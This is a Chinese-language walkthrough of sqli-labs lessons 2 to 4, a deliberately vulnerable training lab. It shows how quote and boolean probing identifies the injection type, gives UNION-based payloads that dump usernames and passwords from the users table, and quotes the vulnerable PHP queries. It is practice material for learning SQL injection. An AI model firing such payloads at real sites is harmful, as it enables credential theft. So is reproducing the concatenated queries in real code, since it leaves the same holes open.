### less-2---整型注入，基于错误的GET

##### 1、访问less-2的页面

###### 1.1、地址为： ip/sqli-labs/Less-2
![Alt text](./../../images/sql/less-2/page.png 'page')

##### 2、注入

###### 2.1、根据页面提示，输入ID作为带数值的参数---判断是否有注入点

![Alt text](./../../images/sql/less-2/id.png 'id参数')

根据之前less-1的，id后面接入英文单引号空格报错，判断可能有注入点

后面输入之前的 ``` ?id=1 and '1'='1 ``` 拼接也是报错，换一种思路，如果后面的``` '1'='1 ``` 不带单引号会出现什么效果呢？发现是正常访问，那么我就不客气了(滑稽)

![Alt text](./../../images/sql/less-2/success.png 'success')

根据之前 less-1 的注入语句进行拼接，然后一步步爆出数据库的数据

```
?id=-1 union select 1,2,(group_concat(id,'-',username,'-',password)) from security.users
```

![Alt text](./../../images/sql/less-1/usersInfo.png 'success')

总结：less-2的课程还是比较容易的，只是和less的注入类型更改了,从之前的需要单引号进行包裹，变成了直接变成变量，具体可以参考sqli-labs的源码的sql语句----id直接作为参数，拼接在sql语句上，如下，less-1和less-2 进行对比

```
// connectivity less-1
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";


// connectivity less-2
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

### less-3---字符型注入，基于错误的单引号变形

```

输' 报错，输入' --+仍报错，输入 and 1=1 /and 1=2无反应
输入') 报错，输入') --+成功显示，输入') and 1=1 --+成功显示，输入and 1=2 报错判断为字符型单引号变形注入

判断为 ')

3?id=-1') union select 1,2,(group_concat(id,'-',username,'-',password)) from security.users --+

按照之前的联合查询的语句，爆出users表的数据

```

![Alt text](./../../images/sql/less-2/3-userinfo.png 'success')

查看源码中的写法

```
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

### less-4---字符型注入，基于错误的双引号变形

```

输' 报错，输入' --+仍报错，输入 and 1=1 /and 1=2无反应
输')报错，输入') --+仍报错，输入 and 1=1 /and 1=2无反应
输入") 报错，输入") --+成功显示，输入") and 1=1 --+成功显示，输入and 1=2 报错判断为字符型单引号变形注入

判断为 ")

3?id=-1") union select 1,2,(group_concat(id,'-',username,'-',password)) from security.users --+

按照之前的联合查询的语句，爆出users表的数据

```

![Alt text](./../../images/sql/less-2/doubledot.png 'success')

查看源码中的写法

```

$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```